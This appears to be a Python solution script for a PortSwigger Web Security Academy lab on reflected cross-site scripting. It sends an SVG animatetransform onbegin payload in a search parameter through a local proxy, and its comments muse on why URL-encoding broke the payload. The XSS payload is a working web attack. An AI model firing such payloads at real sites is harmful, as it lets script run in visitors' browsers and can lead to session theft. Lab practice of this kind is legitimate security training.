# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
import requests

requests.packages.urllib3.disable_warnings()

scheme = "https://"
proxy = "127.0.0.1:8080"
proxies = {scheme: proxy}
verify = False
cookies = {"session": "eW1OY6w78dQrlLm3zMLIeY798J97e53P"}
host = "ac441f5c1efd776280d105eb00d2006e.web-security-academy.net"
path = ""
url = scheme + host + path
# params = {"search": "%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E"}
params = {"search": "\"><svg><animatetransform onbegin=alert(1)>"}
# Payload from not url encoding the query parameter (correct payload):
# <h1>0 search results for '"><svg><animatetransform onbegin=alert(1)>'</h1>
# Payload from url encoding the query parameter (incorrect payload):
# <h1>0 search results for '%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E'</h1>

# Why doesn't the url encoded payload work? According to my understanding right now, it should...
# Perhaps the server is correctly escaping url encoded payloads, but not html encoding payloads.

requests.get(url, params=params, verify=verify, cookies=cookies, proxies=proxies)